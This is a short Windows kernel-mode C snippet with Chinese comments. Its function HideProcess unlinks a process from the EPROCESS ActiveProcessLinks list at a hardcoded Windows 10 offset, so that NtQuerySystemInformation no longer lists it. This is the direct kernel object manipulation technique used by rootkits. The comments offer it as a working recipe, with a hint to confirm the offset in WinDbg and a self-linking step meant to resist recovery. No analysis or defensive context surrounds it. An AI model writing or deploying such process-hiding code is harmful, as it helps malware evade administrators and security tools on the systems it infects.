// 摘 ActiveProcessLinks：让 NtQuerySystemInformation 看不到你的进程
VOID HideProcess(PEPROCESS Target) {
    PLIST_ENTRY Entry = (PLIST_ENTRY)((PUCHAR)Target + 0x448); // Win10 1903+ ActiveProcessLinks 偏移，先用 WinDbg `dt _EPROCESS` 确认
    Entry->Blink->Flink = Entry->Flink;
    Entry->Flink->Blink = Entry->Blink;
    Entry->Flink = Entry->Blink = Entry;  // 自环，防被遍历恢复
}
